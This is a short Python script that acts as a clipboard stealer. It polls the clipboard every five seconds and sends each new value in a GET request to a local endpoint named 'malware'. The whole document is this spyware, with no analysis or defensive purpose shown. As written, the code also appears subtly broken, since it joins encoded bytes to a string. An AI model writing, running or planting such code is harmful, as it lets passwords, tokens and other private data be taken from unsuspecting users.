import urllib, os, sys, requests, pyperclip, time
clist = ['None']

while True:
    clip = pyperclip.paste()
    msg = clip.encode('utf-8')
    if msg not in clist:
        clist.append(msg)
        r = requests.get('http://localhost/malware?clipbord='+ msg)

    time.sleep(5)
